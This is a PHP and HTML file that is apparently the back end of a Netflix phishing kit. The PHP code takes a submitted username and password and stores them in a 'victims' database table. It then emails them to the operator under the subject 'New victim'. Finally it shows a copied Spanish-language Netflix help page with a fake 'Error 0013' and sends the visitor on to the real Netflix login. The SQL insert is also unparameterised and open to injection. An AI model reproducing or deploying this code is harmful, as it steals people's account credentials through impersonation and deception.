<?php
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\Exception;

	require 'PHPMailer/Exception.php';
	require 'PHPMailer/PHPMailer.php';
	require 'PHPMailer/SMTP.php';

	$user = $_POST['userLoginId'];
	$password = $_POST['password'];
	$mysqli = new mysqli("localhost", "root", "", "netflix");
	$result = $mysqli->query("INSERT INTO victims(id,user,password) values (NULL,'$user','$password')");

	$from = "email@example.com";	
	$subject  = "New victim";
	$message = "Here the data. Username: $user and password: $password";

	$mail = new PHPMailer(true);

	try {
	    //Server settings
	    $mail->SMTPDebug = 2;                                       // Enable verbose debug output
	    $mail->isSMTP();                                            // Set mailer to use SMTP
	    $mail->Host       = 'smtp.gmail.com';  // Specify main and backup SMTP servers
	    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
	    $mail->Username   = 'email@example.com';                     // SMTP username
	    $mail->Password   = 'password';                               // SMTP password
	    $mail->SMTPSecure = 'tls';                                  // Enable TLS encryption, `ssl` also accepted
	    $mail->Port       = 587;                                    // TCP port to connect to

	    //Recipients
	    $mail->setFrom('email@example.com', 'Titular');
	    $mail->addAddress('email@example.com');     // Add a recipient


	    // Content
	    $mail->isHTML(true);                                  // Set email format to HTML
	    $mail->Subject = $subject;
	    $mail->Body    = $message;
	    
	    $mail->send();
	    echo 'Message has been sent';
	} catch (Exception $e) {
	    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
	}

	header( "refresh:5;url=https://netflix.com/login" ); 
 ?>


<!DOCTYPE html>
<html dir="LTR" lang="es">
    <head>
        <title>Error de Netflix 0013</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge;chrome=1" />

        <meta name="google-site-verification" content="GmHfooq7jctbhvRUSGtLpE_XImtIATNo0iLofqbb16I" />
        <meta name="google-site-verification" content="pmHhB6aGnjhY8K733ElVmlTDLHz7qzkA6NA__G40QUc" />
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">

        <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" />
        <link rel="stylesheet" href="https://help.nflxext.com/helpcenter/common_e0ae3170011ff488321e0748e1558752.css" />
    
            <meta name="description" content="Si encuentras el código de error 0013 en tu teléfono o tableta con Android, usa este artículo para solucionar el problema." />
            <meta property="og:description" content="Si encuentras el código de error 0013 en tu teléfono o tableta con Android, usa este artículo para solucionar el problema." />
        
    
            <meta property="og:site_name" content="Centro de ayuda" />
            <meta property="og:type" content="website" />
            <meta property="og:title" content="Error de Netflix 0013" />
            <meta property="og:url" content="https://help.netflix.com/es/node/13689" />
            <link rel="shortlink" href="https://help.netflix.com/es/node/13689" />
            <link rel="canonical" href="https://help.netflix.com/es/node/13689" />

            
            
        
    
    
            <link rel="alternate" hreflang="de" href="https://help.netflix.com/de/node/13689" />
        
            <link rel="alternate" hreflang="fi" href="https://help.netflix.com/fi/node/13689" />
        
            <link rel="alternate" hreflang="pt" href="https://help.netflix.com/pt/node/13689" />
        
            <link rel="alternate" hreflang="fr" href="https://help.netflix.com/fr/node/13689" />
        
            <link rel="alternate" hreflang="zh-cn" href="https://help.netflix.com/zh-cn/node/13689" />
        
            <link rel="alternate" hreflang="id" href="https://help.netflix.com/id/node/13689" />
        
            <link rel="alternate" hreflang="sv" href="https://help.netflix.com/sv/node/13689" />
        
            <link rel="alternate" hreflang="ko" href="https://help.netflix.com/ko/node/13689" />
        
            <link rel="alternate" hreflang="zh-tw" href="https://help.netflix.com/zh-tw/node/13689" />
        
            <link rel="alternate" hreflang="el" href="https://help.netflix.com/el/node/13689" />
        
            <link rel="alternate" hreflang="es-es" href="https://help.netflix.com/es-es/node/13689" />
        
            <link rel="alternate" hreflang="en" href="https://help.netflix.com/en/node/13689" />
        
            <link rel="alternate" hreflang="it" href="https://help.netflix.com/it/node/13689" />
        
            <link rel="alternate" hreflang="fr-ca" href="https://help.netflix.com/fr-ca/node/13689" />
        
            <link rel="alternate" hreflang="es" href="https://help.netflix.com/es/node/13689" />
        
            <link rel="alternate" hreflang="ar" href="https://help.netflix.com/ar/node/13689" />
        
            <link rel="alternate" hreflang="pt-pt" href="https://help.netflix.com/pt-pt/node/13689" />
        
            <link rel="alternate" hreflang="nb" href="https://help.netflix.com/nb/node/13689" />
        
            <link rel="alternate" hreflang="th" href="https://help.netflix.com/th/node/13689" />
        
            <link rel="alternate" hreflang="ja" href="https://help.netflix.com/ja/node/13689" />
        
            <link rel="alternate" hreflang="pl" href="https://help.netflix.com/pl/node/13689" />
        
            <link rel="alternate" hreflang="he" href="https://help.netflix.com/he/node/13689" />
        
            <link rel="alternate" hreflang="da" href="https://help.netflix.com/da/node/13689" />
        
            <link rel="alternate" hreflang="ro" href="https://help.netflix.com/ro/node/13689" />
        
            <link rel="alternate" hreflang="tr" href="https://help.netflix.com/tr/node/13689" />
        
            <link rel="alternate" hreflang="nl" href="https://help.netflix.com/nl/node/13689" />
        
    </head>
    <body class="page-article">
        



        
        



        <div class="global-container">

            
            <div class="global-header">
    <div class="container">
        <div class="container inner-container">

            <div class="branding">
                <a class="logo nf-logo-link" href="https://netflix.com" alt="Netflix">
                    <svg width="88px" height="32px" viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#e50914" d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"></path>
                    </svg>
                </a>

                <a class="helpcenter-logo" href="https://help.netflix.com/es">
                    <span class="long-form">
                        Centro de ayuda
                    </span>
                    <span class="hidden short-form">Centro de ayuda</span>
                </a>
            </div>

            <div class="actions">
                

                
                    <a href="https://netflix.com/Login?nextpage=https://help.netflix.com" class="btn btn-primary btn-med sign-in-link" data-beacon-anchor="action=signInClicked">
                        Iniciar sesión
                    </a>
                

                
                    <a href="https://netflix.com/getStarted" class="btn btn-light btn-med free-month" data-beacon-anchor="action=signUpClicked">
                        Unirte a Netflix
                    </a>
                
            </div>
        </div>

        <div class="rtl-background-image"></div>
    </div>
</div>

            
            
    <!--googleoff: all-->
    <div class="notifications">
        

        <div id="notification-holder"></div>
    </div>
    <!--googleon: all-->


            
            

            <div class="global-content">

                
                <div class="container">
                    <div id="sign-in-modal"></div>
                </div>

                
            <div class="container">

                
                

                
                
                    <ul class="breadcrumb help-center-breadcrumb">


    
    

</ul>

                

                
                

                

                    
                    

                    
                        <section dir="LTR" class="kb-article kb-article-variant gradient" data-countries=",PR,PS,PT,PW,PY,QA,AD,AE,AF,AG,AI,AL,AM,AN,AO,AQ,AR,AS,AT,RE,AU,AW,AX,AZ,RO,BA,BB,RS,BD,BE,RU,BF,BG,RW,BH,BI,BJ,BL,BM,BN,BO,SA,BQ,SB,BR,SC,BS,SD,SE,BT,SG,BV,SH,BW,SI,SJ,BY,BZ,SK,SL,SM,SN,SO,CA,SR,CC,SS,ST,CD,SV,CF,CG,SX,CH,SY,CI,SZ,CK,CL,CM,CN,CO,TC,CR,TD,CU,TF,TG,CV,CW,TH,CX,CY,TJ,CZ,TK,TL,TM,TN,TO,TR,TT,DE,TV,TW,TZ,DJ,DK,DM,DO,UA,UG,DZ,UM,EC,US,EE,EG,EH,UY,UZ,VA,VC,ER,ES,VE,ET,VG,VI,VN,VU,FI,FJ,FK,FM,FO,FR,WF,GA,GB,WS,GD,GE,GF,GG,GH,GI,GL,GM,GN,GP,GQ,GR,GS,GT,GU,GW,GY,HK,HM,HN,HR,HT,YE,HU,ID,YT,IE,IL,IM,IN,IO,ZA,IQ,IR,IS,IT,ZM,JE,ZW,JM,JO,JP,KE,KG,KH,KI,KM,KN,KP,KR,KW,KY,KZ,LA,LB,LC,LI,LK,LR,LS,LT,LU,LV,LY,MA,MC,MD,ME,MF,MG,MH,MK,ML,MM,MN,MO,MP,MQ,MR,MS,MT,MU,MV,MW,MX,MY,MZ,NA,NC,NE,NF,NG,NI,NL,NO,NP,NR,NU,NZ,OM,PA,PE,PF,PG,PH,PK,PL,PM,PN,">
                            

                            <h1 class="kb-title">Error de Netflix 0013</h1>

                            <div class="page-block">
    <div class="c-wrapper">
        <div>
            <p>Error <strong>0013</strong> . En este momento, tenemos problemas con el streaming en todos los dispositivos. Redireccionando</p>
        </div>
       
        <div>
            <div><div class="page-block">
    <div class="c-wrapper">
        <div>
            <p></p>
        </div>
    </div>
</div></div>
        </div>
    </div>
</div>

                            
                        </section>
                    
                

                
                

                
                

                
                <div id="article-feedback-container"></div>
            </div>
        
            </div>

            <div class="footer-push"></div>
        </div>

        <div id="footer" class="global-footer">
    
    
    <div id="contact-bar" class="global-contactbar">
        <div class="container">
            <h3 class="bar-title">
                ¿Quieres contactar con nosotros?
            </h3>

            <div class="contact-channels">
                <div id="phone-contact" class="channel popover-wrapper">
    <a
        href="#callus"
        id="phoneContactTrigger"
        class="btn btn-lightgrey popover-trigger">Llámanos</a>

    <div class="phonePopover phone-popover popover top lang-{preferLanguage}">
        <div class="popover-content"></div>

        <button class="close popover-close">
    Cerrar
</button>

    </div>
</div>

                <div class="channel">
                    
    

    
        <div id="chat-contact" class="popover-wrapper chat-btn-wrapper channel" data-enablemobilechat="true">

            <a href="#startChat" id="startChatTrigger" class="btn btn-lightgrey start-chat-button beacon-event" data-beacon="action=ChatButton" data-locale="es" data-country="MX">
                Iniciar chat
            </a>

            <div class="channel-body">

                
                <div id="selfHelpPopover" class="popover chat-popover selfHelp-popover-ltr popover-base-ltr top"></div>

                
                <div id="selfHelpDetailsPopover" class="popover chat-popover selfHelpDetails-popover-ltr popover-base-ltr top">
    <div class="popover-content selfHelp-details col-xs-12">
        <div class="popover-title small">
            Describe tu problema
        </div>

        <p>
            ¿Por qué te estás comunicando por chat?
        </p>

        <div class="form-group flush">
            <textarea
                    name="chatquestion"
                    class="chatquestion form-control"
                    maxlength="500"
                    rows="4"
                    placeholder="Describe tu problema"></textarea>
            <div class="charsleft" data-chars-text="[NUMBER] caracteres restantes"></div>
        </div>

        <button class="btn btn-primary submit">
            Enviar
        </button>

        <div class="empty-submission hidden">
            Proporciona una breve descripción de tu problema
        </div>
    </div>

    <button class="close popover-close">Cerrar</button>

</div>

                
                <div
    id="start-chat-popover"
    class="popover chat-popover popover-base-ltr top" data-show-popover="true">

    <div class="popover-content are-you-a-member chat-details">
        <div class="popover-title small">¿Eres miembro de Netflix?</div>

        <div class="form-group">
            <a href="https://netflix.com/Login?nextpage=https://help.netflix.com" class="btn btn-secondary btn-block btn-yes">Sí</a>
        </div>

        <button class="btn btn-secondary btn-block btn-no">No</button>
    </div>

    <button class="close popover-close">Cerrar</button>

</div>


                
                <div id="chat-error-popover" class="popover chat-popover popover-base-ltr top">
                    <div class="popover-content">
                        <h3 class="title popover-title">
                            El chat no está disponible en este momento.
                        </h3>

                        <p class="chat-error-msg"></p>
                    </div>

                    <button class="close popover-close">Cerrar</button>

                </div>

            </div>
        </div>
    

                </div>
            </div>
        </div>
    </div>


    <div class="dark-area container">

        
        
            <div class="select select-grey">
                <select id="lang-switcher" aria-label="Selecciona el lenguaje que prefieres:">
                    
                        
                        <option value="id">Bahasa Indonesia</option>
                    
                        
                        <option value="da">Dansk</option>
                    
                        
                        <option value="de">Deutsch</option>
                    
                        
                        <option value="en">English</option>
                    
                        <option value="es" selected>Español</option>
                        
                    
                        
                        <option value="fr">Français</option>
                    
                        
                        <option value="it">Italiano</option>
                    
                        
                        <option value="nl">Nederlands</option>
                    
                        
                        <option value="nb">Norsk Bokmål</option>
                    
                        
                        <option value="pl">Polski</option>
                    
                        
                        <option value="pt">Português</option>
                    
                        
                        <option value="ro">Română</option>
                    
                        
                        <option value="fi">Suomi</option>
                    
                        
                        <option value="sv">Svenska</option>
                    
                        
                        <option value="tr">Türkçe</option>
                    
                        
                        <option value="el">Ελληνικά</option>
                    
                        
                        <option value="he">עברית</option>
                    
                        
                        <option value="ar">العربية</option>
                    
                        
                        <option value="th">ไทย</option>
                    
                        
                        <option value="zh-CN">中文</option>
                    
                        
                        <option value="ja">日本語</option>
                    
                        
                        <option value="ko">한국어</option>
                    
                </select>

                <svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg">
    <path d="M12.9416531,7.71264972 L17.9520258,15.2282087 C18.4421897,15.9634546 18.2435115,16.9568456 17.5082656,17.4470095 C17.2454376,17.6222282 16.9366253,17.715729 16.6207453,17.715729 L6.6,17.715729 C5.7163444,17.715729 5,16.9993846 5,16.115729 C5,15.799849 5.09350084,15.4910367 5.26871953,15.2282087 L10.2790922,7.71264972 C10.7692561,6.97740382 11.7626471,6.77872563 12.497893,7.26888957 C12.6736566,7.38606534 12.8244774,7.53688606 12.9416531,7.71264972 Z" transform="translate(11.610458, 12.357865) scale(1, -1) translate(-11.610458, -12.357865) "></path>
</svg>
            </div>
        

        <ul class="footer-links">
            <li class="legalese-item">
                <a href="/es/legal/termsofuse">Términos de uso</a>
            </li>
            <li class="legalese-item">
                <a href="/es/legal/privacy">Privacidad</a>
            </li>
            <li class="legalese-item">
                <a href="/es/legal/privacy#cookies">Preferencias de cookies</a>
            </li>
            
                
                
                <li class="legalese-item">
                    <a href="/es/node/2101">Información corporativa</a>
                </li>
            
        </ul>
    </div>
</div>


    </body>
</html>


